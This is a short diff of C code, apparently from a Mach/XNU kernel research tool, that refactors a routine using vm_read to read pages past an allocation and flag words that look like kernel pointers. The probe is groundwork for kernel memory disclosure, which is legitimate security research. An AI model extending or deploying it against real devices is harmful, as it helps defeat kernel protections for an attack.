@@ -16771,21 +16771,11 @@ static void r423_probe(void) {
             /* Fill with known pattern */
             memset(base, 0xCC, allocSz);
 
-            /* Try to read pages beyond our allocation */
-            volatile uint8_t *probe;
+            /* Try to read pages beyond our allocation via vm_read */
             rlog("    Probing beyond backing store:\n");
-
-            /* Set up signal handler for safe access */
-            struct sigaction oldAct, newAct;
-            memset(&newAct, 0, sizeof(newAct));
-            sigjmp_buf r423_jmp;
-            volatile int r423_faulted = 0;
-            newAct.sa_handler = r419_sighandler; /* reuse */
-
-            /* We'll do manual probing at page boundaries */
             for (int pg = 0; pg <= 4; pg++) {
                 size_t off = allocSz + (pg * 16384);
-                probe = (volatile uint8_t *)base + off;
+                volatile uint8_t *probe = (volatile uint8_t *)base + off;
 
                 /* Use vm_read to safely check without crashing */
                 vm_offset_t data = 0;
@@ -16796,12 +16786,12 @@ static void r423_probe(void) {
                     uint64_t *ptr = (uint64_t *)data;
                     rlog("      +%zu: readable! first=0x%016llx\n",
                         off, (unsigned long long)ptr[0]);
-                    for (int w = 0; w < 8; w++) {
-                        if ((ptr[w] >> 32) >= 0xFFFFFFF0ULL &&
-                            ptr[w] != 0xFFFFFFFFFFFFFFFF &&
-                            ptr[w] != 0xCCCCCCCCCCCCCCCCULL) {
+                    for (int ww = 0; ww < 8; ww++) {
+                        if ((ptr[ww] >> 32) >= 0xFFFFFFF0ULL &&
+                            ptr[ww] != 0xFFFFFFFFFFFFFFFF &&
+                            ptr[ww] != 0xCCCCCCCCCCCCCCCCULL) {
                             rlog("      *** +%zu word[%d]: 0x%016llx KERNEL ***\n",
-                                off, w, (unsigned long long)ptr[w]);
+                                off, ww, (unsigned long long)ptr[ww]);
                         }
                     }
                     vm_deallocate(mach_task_self(), data, dataCnt);
